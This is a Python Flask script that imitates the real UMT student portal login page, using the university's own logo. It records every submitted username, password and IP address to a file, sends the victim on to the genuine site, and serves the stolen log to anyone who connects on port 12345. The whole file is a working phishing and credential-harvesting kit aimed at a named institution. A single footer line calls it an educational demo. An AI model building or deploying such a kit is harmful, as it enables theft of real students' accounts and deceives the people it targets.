from flask import Flask, request, render_template_string, redirect
import socket
import threading
import datetime

app = Flask(__name__)

# ===== REALISTIC UMT LOGIN PAGE =====
UMT_LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>UMT Portal - Student Login</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background-color: #f5f5f5; 
            margin: 0; 
            padding: 0; 
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-box {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            width: 350px;
            text-align: center;
        }
        .logo {
            width: 150px;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .login-btn {
            background-color: #1a56a7;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            margin-top: 10px;
        }
        .login-btn:hover {
            background-color: #16478d;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #777;
        }
        .warning {
            color: red;
            font-size: 10px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://umt.edu.pk/wp-content/uploads/2020/04/umt-logo-1.png" class="logo" alt="UMT Logo">
        <h3>Student Portal Login</h3>
        
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Student ID/Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="login-btn">Login</button>
        </form>
        
        <div class="footer">
            <a href="#">Forgot password?</a> | <a href="#">Help Center</a>
        </div>
        <div class="warning">
            This is a simulated phishing demo for cybersecurity education purposes only.
        </div>
    </div>
</body>
</html>
"""

# ===== CREDENTIAL LOGGING =====
def log_credentials(username, password, ip):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("umt_credentials_log.txt", "a") as f:
        f.write(f"[{timestamp}] IP: {ip} | Username: {username} | Password: {password}\n")

@app.route('/')
def home():
    return render_template_string(UMT_LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr
    log_credentials(username, password, ip)
    return redirect("https://umt.edu.pk")  # Redirects to real UMT site

# ===== LOG VIEWER SERVER =====
def log_viewer_server():
    host = '0.0.0.0'
    port = 12345
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen()
        print(f"[*] Log viewer running at {host}:{port}")
        while True:
            conn, addr = s.accept()
            with conn:
                with open("umt_credentials_log.txt", "r") as f:
                    logs = f.read()
                conn.sendall(logs.encode())

if __name__ == "__main__":
    # Start Flask in thread
    flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000))
    flask_thread.daemon = True
    flask_thread.start()
    
    # Start log viewer
    log_viewer_server()